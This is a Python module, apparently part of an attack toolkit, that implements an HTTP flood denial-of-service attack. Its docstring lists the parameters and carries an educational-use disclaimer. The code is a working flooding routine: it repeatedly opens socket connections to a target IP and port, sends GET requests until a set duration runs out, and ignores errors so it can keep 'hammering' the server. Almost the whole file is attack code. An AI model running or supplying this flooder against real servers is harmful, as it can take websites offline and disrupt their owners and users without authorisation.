"""
HTTPFlood.py

Implements an HTTP Flood attack using standard Python sockets.

Parameter summary
+-------------+-------+-------------------------------------------+
| parameter   | type  | default / purpose                         |
+-------------+-------+-------------------------------------------+
| target_port | int   | 80  - TCP port of web server              |
| duration    | int   | 10 - attack runtime in seconds            |
| path        | str   | "/" - URL path to request                 |
| read_reply  | bool  | False - read & discard server response    |
+-------------+-------+-------------------------------------------+


DISCLAIMER:
This tool is designed strictly for educational purposes and controlled network security testing.
"""

import time
import socket
from attacks.attack import Attack

class HTTPFlood(Attack):
    """Send repeated HTTP-GET requests until *duration* seconds have elapsed."""
    
    USER_AGENT = "HttpFlood/1.0"
    
    # ------------------------------------------------------------------ #
    def execute(self) -> None:
        
        self.wait_until_start()
        port       = self.parameters.get("target_port", 80)
        duration   = self.parameters.get("duration", 10)
        path       = self.parameters.get("path", "/")
        read_reply = self.parameters.get("read_reply", False)

        self._http_flood(self.target_ip, port, duration, path, read_reply)

    # ------------------------------------------------------------------ #
    @staticmethod
    def _http_flood(host: str,port: int,duration: int,path: str,read_reply: bool) -> None:
        deadline = time.time() + duration
        request  = (f"GET {path} HTTP/1.1\r\n"f"Host: {host}\r\n"
            f"User-Agent: {HTTPFlood.USER_AGENT}\r\n"
            "Connection: close\r\n\r\n"
        ).encode()

        while time.time() < deadline:
            try:
                # Short timeout keeps the loop responsive on dead hosts
                with socket.create_connection((host, port), timeout=0.5) as sock:
                    sock.sendall(request)
                    if read_reply:
                        sock.recv(4096)     # discard response
            except Exception:
                # Ignore connection errors; keep hammering
                pass